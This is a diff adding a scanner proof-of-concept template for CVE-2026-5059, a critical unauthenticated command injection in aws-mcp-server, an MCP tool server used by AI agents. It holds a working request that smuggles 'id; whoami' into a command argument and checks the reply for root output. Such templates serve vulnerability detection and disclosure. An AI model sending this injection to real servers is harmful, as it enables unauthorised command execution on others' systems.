@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "aws-mcp-server 存在命令注入漏洞，攻击者可通过向 MCP 服务器发送恶意构造的 HTTP 请求，在无需身份认证的情况下触发系统命令执行。该漏洞源于 aws-mcp-server 对 allowed commands 列表中用户输入字符串缺乏充分验证，导致攻击者能够注入并执行任意系统命令。CVSS 评分 9.8，危害等级严重。"
+id = "POC-AVE-2026-1193"
+name = "CVE-2026-5059 PoC"
+severity = "critical"
+tags = ["ave-2026-1193"]
+vuln_id = [
+    "CVE-2026-5059",
+    "AVE-2026-1193",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp/tools/call"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"tool": "allowed_command", "arguments": {"command": "id; whoami"}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "root",
+]
